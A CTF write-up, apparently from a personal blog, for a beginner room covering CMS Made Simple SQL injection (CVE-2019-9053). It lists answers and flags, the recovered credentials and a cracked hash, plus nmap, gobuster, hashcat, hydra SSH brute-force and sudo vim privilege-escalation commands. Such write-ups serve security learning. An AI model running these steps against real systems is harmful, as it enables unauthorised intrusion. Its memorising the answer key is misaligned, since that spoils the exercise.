---
title: "Simple Ctf"

date: 2023-01-08
url: /simple-ctf/
image: images/2023-thumbs/simple-ctf.png
categories:
  - CTF
tags:
  - CTF
draft: false
---

Beginner level ctf

## Questions
1. How many services are running under port 1000? `2`
2. What is running on the higher port? `ssh`
3. What's the CVE you're using against the application? `CVE-2019-9053`
4. To what kind of vulnerability is the application vulnerable? `SQLi`
5. What's the password? `secret`
6. Where can you login with the details obtained? `ssh`
7. What's the user flag? `G00d j0b, keep up!`
8. Is there any other user in the home directory? What's its name? `sunbath`
9. What can you leverage to spawn a privileged shell? `vim`
10. What's the root flag? `W3ll d0n3. You made it!`

---
## Notes
- IP = 10.10.123.106

### Exposed Services
```bash
21
80
2222 ssh
```

### Users:Passwords
- mitch:secret
    - username found via 46635.py script
    - password found via hydra

### Vulnerabilities
- CVE-2019-9053
    - found via $IP/simple
    - CMS Made Simple version 2.2.8
    - exploitdb 46635.py

### 46635.py
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
- hash.txt
`0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`

---
## Commands
`ping $IP`

`sudo nmap -sC -sV -p 1-1000 -oN scans/initial $IP`

`sudo nmap -sC -sV -oN scans/common 10.10.123.106`

`sudo nmap --script=vuln 10.10.123.106`

`gobuster dir -u http://10.10.123.106 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster`

`hashcat -m 20 -a 0 hash.txt /usr/local/share/wordlists/rockyou.txt`

`hydra -v -l mitch -P /usr/local/share/wordlists/rockyou.txt -s 2222 10.10.123.106 ssh`

`sudo -l #found vim`

`sudo vim /root #found root.txt`
